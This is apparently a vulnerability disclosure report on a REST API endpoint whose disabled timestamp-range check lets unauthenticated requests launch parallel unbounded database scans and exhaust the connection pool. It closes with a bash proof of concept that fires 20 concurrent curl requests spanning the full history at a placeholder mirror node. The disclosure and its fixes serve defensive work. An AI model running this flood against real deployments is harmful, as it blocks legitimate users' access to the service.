### Title
Parallel Unbounded Historical Query Execution in `getOneAccount()` Enables DB Pool Exhaustion via Unauthenticated Requests

### Summary
`getOneAccount()` in `rest/accounts.js` explicitly passes `validateRange=false` to `parseTimestampFilters()`, bypassing the `maxTimestampRange` guard entirely. This allows any unauthenticated caller to supply an arbitrarily large timestamp window. Both the entity `UNION ALL` query and `doGetTransactions()` are then launched in parallel via `Promise.all()`, each consuming a separate DB connection and scanning large historical tables simultaneously. A moderate number of concurrent such requests exhausts the shared connection pool, degrading mirror node REST processing capacity.

### Finding Description

**Exact code path:**

`rest/accounts.js`, `getOneAccount()`, line 413:
```js
const timestampRange = utils.parseTimestampFilters(timestampFilters, false, true, true, false, false);
```
The sixth argument is `validateRange=false`. In `rest/utils.js` lines 1657–1665, the `maxTimestampRange` enforcement block is gated on this flag:
```js
if (validateRange) {
  const {maxTimestampRange, maxTimestampRangeNs} = config.query;
  if (difference !== null && (difference > maxTimestampRangeNs || difference <= 0n)) {
    throw new InvalidArgumentError(...);
  }
}
```
Because `validateRange=false`, the default 7-day cap (`maxTimestampRange=7d`) is never applied for this endpoint.

**Parallel execution:**

`rest/accounts.js` lines 487–495:
```js
const entityPromise = pool.queryQuietly(entityQuery, entityParams);
const transactionsPromise = includeTransactions
  ? transactions.doGetTransactions(filters, req, timestampRange)
  : emptyTransactionsPromise;
const [entityResults, transactionResults] = await Promise.all([entityPromise, transactionsPromise]);
```
Both branches fire simultaneously. The entity query, when timestamp filters are present, executes a `UNION ALL` across `entity` and `entity_history` (lines 210–219 of `getEntityBalanceQuery`). `doGetTransactions()` issues a multi-table query joining `transaction`, `crypto_transfer`, `token_transfer`, and `entity_transaction` with full outer joins. Each request therefore holds **at least two** pool connections for the full query duration.

**`bindTimestampRange` does not help:**

`rest/timestampRange.js` line 20: `if (!queryConfig.bindTimestampRange) { return {range}; }` — this feature defaults to `false` and is opt-in, so no automatic bounding occurs in default deployments.

**No per-IP rate limiting in the REST API:**

The throttle/rate-limiting infrastructure found (`ThrottleManagerImpl`, bucket4j) belongs exclusively to the `web3` Java module. The Node.js REST API (`rest/`) has no equivalent per-IP or per-endpoint rate limiter. The only global constraint is the DB pool size (`db.pool.maxConnections`).

### Impact Explanation
Each crafted request consumes 2+ DB connections for the duration of two expensive historical scans. With a default or small `maxConnections` pool, a small number of concurrent attackers (e.g., 10–20 requests with a multi-year timestamp range) can saturate the pool. New legitimate requests then queue or fail with connection timeout errors, degrading or halting REST API processing. Since the mirror node REST API is the primary read interface for downstream services and dApps, sustained pool exhaustion constitutes degradation of ≥30% of mirror node processing capacity without requiring any privileged access.

### Likelihood Explanation
The attack requires zero authentication, zero special knowledge beyond a valid account ID (trivially obtained from any public explorer), and a single HTTP GET request. The timestamp parameters `gte:0` and `lte:9999999999.999999999` are valid and accepted. The attack is trivially scriptable, repeatable, and requires no brute force. Any public-facing mirror node deployment is exposed.

### Recommendation
1. **Remove the `validateRange=false` override** in `getOneAccount()` (line 413 of `rest/accounts.js`). Pass `true` so the existing `maxTimestampRange` (7d default) is enforced for this endpoint as it is for others.
2. **Enable `bindTimestampRange`** or enforce an upper bound on the timestamp range within `doGetTransactions()` when called from `getOneAccount()`.
3. **Add per-IP or per-endpoint rate limiting** to the Node.js REST API (e.g., via express-rate-limit or an ingress-level middleware) analogous to the Traefik `inFlightReq` and `rateLimit` middleware already present in the Rosetta Helm chart.
4. Consider **serializing** the entity and transaction queries (remove `Promise.all`) when timestamp filters are present, to halve per-request DB connection consumption.

### Proof of Concept
```bash
# Step 1: Obtain any valid account ID (e.g., 0.0.98 is always present)
ACCOUNT="0.0.98"
MIRROR="https://<mirror-node-host>"

# Step 2: Craft a request spanning the full history with transactions enabled
URL="${MIRROR}/api/v1/accounts/${ACCOUNT}?timestamp=gte:0&timestamp=lte:9999999999.999999999&transactions=true"

# Step 3: Send concurrent requests to exhaust the DB pool
for i in $(seq 1 20); do
  curl -s "$URL" > /dev/null &
done
wait

# Step 4: Observe that subsequent legitimate requests time out or return 503/connection errors
curl -v "${MIRROR}/api/v1/accounts/${ACCOUNT}"
```
Each iteration of step 3 fires two parallel long-running DB queries. With 20 concurrent requests and a typical `maxConnections` of 10–20, the pool is exhausted and legitimate traffic is blocked for the duration of the scans (bounded only by `statementTimeout`).
